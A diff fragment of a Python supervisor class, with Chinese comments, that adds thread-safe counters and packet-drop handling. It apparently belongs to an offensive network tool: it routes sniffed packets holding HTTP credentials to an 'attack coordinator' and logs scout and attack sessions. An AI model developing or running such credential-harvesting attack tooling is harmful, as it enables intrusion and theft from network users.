@@ -274,19 +274,30 @@ class PythonSupervisor:
         try:
             # 解析数据包
             packet_info = json.loads(packet_data)
-            self.stats['packets_processed'] += 1
+            with self.stats_lock:
+                self.stats['packets_processed'] += 1
             
             # 分析数据包
             analysis_result = self.packet_analyzer.analyze(packet_info)
             
             if analysis_result:
-                # 根据分析结果做出决策
-                decision = self.attack_coordinator.make_decision(analysis_result)
-                
-                if decision:
-                    self._execute_decision(decision)
+                # ★★★【关键修复】★★★ 优先处理高价值事件，确保原子性
+                if hasattr(analysis_result, 'http_credentials') and analysis_result.http_credentials:
+                    # 高价值事件使用专门的原子处理方法
+                    self.attack_coordinator.process_high_value_event_atomic(analysis_result)
+                else:
+                    # 常规事件使用普通决策流程
+                    decision = self.attack_coordinator.make_decision(analysis_result)
+                    if decision:
+                        self._execute_decision(decision)
                     
+        except json.JSONDecodeError:
+            with self.stats_lock:
+                self.stats['packets_dropped'] += 1
+            self.logger.debug(f"Failed to decode JSON: {packet_data[:100]}")
         except Exception as e:
+            with self.stats_lock:
+                self.stats['packets_dropped'] += 1
             self.logger.error(f"Error processing packet: {e}")
             
     # ★【新增】★ 批量命令处理方法
@@ -446,6 +457,11 @@ class PythonSupervisor:
                         if hasattr(self.attack_coordinator, 'get_session_stats'):
                             session_stats = self.attack_coordinator.get_session_stats()
                             self.logger.info(f"  Sessions: Scout {session_stats['active_scouts']}/{session_stats['max_scout_attacks']}, Attack {session_stats['active_attacks']}/{session_stats['max_active_attacks']}")
+                        
+                        # ★【新增】★ 显示并发状态监控
+                        if hasattr(self.attack_coordinator, 'get_concurrency_stats'):
+                            concurrency_stats = self.attack_coordinator.get_concurrency_stats()
+                            self.logger.info(f"  Concurrency: Processing {concurrency_stats.get('processing_credentials', 0)} credentials, Restoring {concurrency_stats.get('restoring_targets', 0)} targets")
                         
                         # 更新统计
                         last_packets = current_packets
